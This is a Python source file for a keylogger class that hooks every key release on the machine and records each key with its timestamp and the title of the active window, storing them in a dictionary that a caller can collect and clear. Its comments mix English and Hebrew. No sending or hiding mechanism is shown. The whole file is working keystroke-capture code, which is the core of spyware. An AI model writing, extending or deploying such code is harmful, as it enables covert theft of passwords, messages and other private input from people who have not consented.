import keyboard
from  datetime import datetime
import pygetwindow as pw

class KeyloggerService:

    """
    This class receives all user keystrokes with data on the keystrokes.
    The data is the click time and the window in which it was pressed
    """
    # Initializing the class with a data field, and starting listening
    def __init__(self):
        self.__data = {}
        self.start()

    # מחזירה את הנתונים משדה __data ומאפסת את שדה זה
    @property
    def data(self):
        temp_data = self.__data
        self.__data = {}
        return temp_data

    def start(self):
        #
        keyboard.on_release(self.handle_input)

    @staticmethod
    def get_keyword(key: keyboard.KeyboardEvent):
        key_name = key.name
        # להבדיל בין תווים למקשים מיוחדים
        # למצוא דרך לזהות לחיצה על כמה מקשים בו זמנית
        # לתקן הצפנה של תווים מיוחדים
        if len(key_name) > 1:
            key_name = '~' + key_name + '~'
        #

        return key_name

    @staticmethod
    def get_time(key: keyboard.KeyboardEvent):
        key_time = key.time
        key_time = datetime.fromtimestamp(key_time).strftime('%Y-%m-%d %H:%M')
        return key_time

    @staticmethod
    def get_active_window():
        return pw.getActiveWindowTitle()

    def handle_input(self,key):
        active_window = self.get_active_window()
        if active_window not in self.__data:
            self.__data[active_window] = {}

        current_time = self.get_time(key)
        if current_time not in self.__data[active_window]:
            self.__data[active_window][current_time] = ''

        key_name = self.get_keyword(key)
        self.__data[active_window][current_time] += key_name





